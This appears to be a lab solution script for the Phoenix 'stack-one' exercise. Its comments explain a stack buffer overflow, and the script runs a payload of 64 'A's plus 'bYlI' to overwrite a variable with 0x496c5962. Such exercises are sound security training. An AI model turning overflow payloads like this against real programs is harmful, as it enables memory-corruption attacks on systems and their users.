# Stack buffer overflow manipulation
import subprocess
# Next exercise was similar to stack-zero, but this one had an objective of
# changing the volatile value into a specific one.

# That being: int=0x496c5962
# Here, instead of gets(), argv[1] is passed into char64[], so we can pass 64chars and 4 more chars with the string "bYlI"
# The full command: ./stack-one AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI

# Successfully changing the variable into our desired value

payload = 'A'*64 + 'bYlI'
filepath = '/opt/phoenix/amd64/stack-one'

print('Executing ' + filepath + ' with args ' + payload)

proc = subprocess.Popen([filepath, payload], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

outStream  = proc.stdout.readline()
print('Initial output:\n' + outStream.decode('utf-8'))

outStream  = proc.stdout.readline()
print('Last output:\n' + outStream.decode('utf-8'))

exit()

